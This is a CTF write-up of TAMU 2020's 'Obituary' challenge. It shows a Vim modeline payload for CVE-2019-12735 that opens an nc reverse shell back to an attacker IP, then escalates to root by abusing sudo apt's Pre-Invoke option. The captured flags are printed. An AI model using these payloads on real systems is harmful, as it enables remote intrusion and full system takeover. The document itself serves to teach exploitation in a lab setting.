---
title: "[EN] [CTF] TAMU - Obituary"
description: "Write-up for challenge 'Obituary' (Network Pentest, 2 × 500 pts) from TAMU CTF 2020."
tags: [ "CTF", "Pentest", "vim" ]
lastmod: "2020-03-30 18:11:58"
date: "2020-03-30 12:22:12"
categories:
    - "Write-up"
type: post
slug: "ctf-tamu-obituary-500"
cover: "/media/2020/03/f7e59c09e1d415108b97139ba3306e77.png"
---

> Hey, shoot me over your latest version of the code. I have a simple nc session up, just pass it over when you're ready. You're using vim, right? You should use it; it'll change your life. I basically depend on it for everything these days!
> 
> NOTE: This challenge is two parts. Flag one belongs to mwazoski. Flag two belongs to root.

{{< highlight plaintext >}}
client
nobind
dev tap
remote-cert-tls server
float
explicit-exit-notify

remote obituary.naum.tamuctf.com 2005 udp

<key>[...]</key>
<cert>[...]</cert>
<ca>[...]</ca>
key-direction 1

cipher AES-256-CBC
auth SHA256
comp-lzo
{{< /highlight >}}

Once the VPN connection is established, we can see that the `172.30.0.2` server exposes a service on port 4321. It is therefore on this port that we will send our files. The challenge description mentioning the use of vim, we suspect that the exploitation of a possible flaw in the text editor will allow us to execute code remotely.

This is precisely what the **CVE-2019–12735** allows! The flaw resides in the way how the text editor handles the "modelines" a feature that’s enabled by default to automatically find and apply a set of custom preferences as mentioned by the creator of a file at the starting and ending lines in a document. Therefore, just opening an innocent looking specially crafted malicious file using **Vim** or **Neovim** editor could allow attackers to execute commands on Linux system and ultimately take over the target system.

We need to suppose the server uses Vim before version 8.1.1365 and has the modeline option enabled, but it is easy to check it. First, we need to craft a malicious file with our payload :

{{< highlight shell >}}
$ cat revshell.txt
:!nc -nv 172.30.0.14 4444 -e /bin/sh ||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
{{< /highlight >}}

When this file is opened by the vulnerable Vim, if will offer us a reverse shell on the server. All we have to do is open port 4444 for listening and send the file with `cat revshell.txt | nc 172.30.0.2 4321`.

{{< highlight shell >}}
$ nc -nlvp 4444
Listening on [0.0.0.0] (family 2, port 4444)
Connection from 172.30.0.2 55610 received!

> id
uid=1000(mwazowski) gid=1000(mwazowski) groups=1000(mwazowski)

> ls -l /home/mwazowski
total 12
-rw-rw-r-- 1 root root  28 Mar 19 00:40 flag.txt
-rw-r--r-- 1 root root  96 Mar 21 08:04 manually_installed_packages.txt
-rw-rw-r-- 1 root root 342 Mar 19 00:40 note_to_self.txt

> cat /home/mwazowski/flag.txt
gigem{ca7_1s7_t0_mak3_suRe}
{{< /highlight >}}

> gigem{ca7_1s7_t0_mak3_suRe}

As stated above, the user "mwazoski" owns the first flag and root owns the second one. So we need to elevate our privileges. In our home directory, we can see two other files: `manually_installed_packages.txt` and `note_to_self.txt`.

{{< highlight shell >}}
mwazowski@172.30.0.2:~$ cat /home/mwazowski/manually_installed_packages.txt
Apparently my packages are out of date. ITSEC is really throwing a fit about me
needing to update since red team popped my box.

I'm sending them my installed packages. I have no idea how these guys got root
on my machine, my password is like 60 characters long. The only thing I have
as nopasswd is apt, which I just use for updates anyway.

mwazowski@172.30.0.2:~$ sudo -l
Matching Defaults entries for mwazowski on 72db72483a28:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mwazowski may run the following commands on 72db72483a28:
    (root) NOPASSWD: /usr/bin/apt
{{< /highlight >}}

We can see here, the user "mwazowski" is only allowed to execute the command `apt` to allow him to perform updates on the machine. At least this was the intention...

If we look at the very bottom, we will notice that there is an `--option` flag that can be passed into `apt`. This allows us to set an “arbitrary configuration option”. In digging into the documentation further, I come across a series of configuration items available to the options parameter of the following kind.

{{< highlight shell >}}
$ man apt-get
[...]
-o, --option
    Set a Configuration Option. This will set an arbitrary configuration option. The syntax is -o Foo::Bar=bar.
[...]
{{< /highlight >}}

From here, all we need to do is run `apt update` with this `--option` flag :

{{< highlight shell >}}
$ nc -nlvp 4444
Listening on [0.0.0.0] (family 2, port 4444)
Connection from 172.30.0.2 55610 received!

> id
uid=1000(mwazowski) gid=1000(mwazowski) groups=1000(mwazowski)

> sudo apt update -o APT::Update::Pre-Invoke::="/bin/bash -i"

> id
uid=0(root) gid=0(root) groups=0(root)

> ls -l /root
total 4
-rw-rw-r-- 1 root root 48 Mar 19 00:40 flag.txt

> cat /root/flag.txt
gigem{y0u_w0u1d_7h1nk_p3opl3_W0u1d_Kn0W_b3773r}
{{< /highlight >}}

> gigem{y0u_w0u1d_7h1nk_p3opl3_W0u1d_Kn0W_b3773r}

---

Sources:

- https://medium.com/@magrabursofily/exploit-poc-linux-command-execution-on-vim-neovim-vulnerability-cve-2019-12735-4c770d5573cf
- https://lsdsecurity.com/2019/01/linux-privilege-escalation-using-apt-get-apt-dpkg-to-abuse-sudo-nopasswd-misconfiguration/
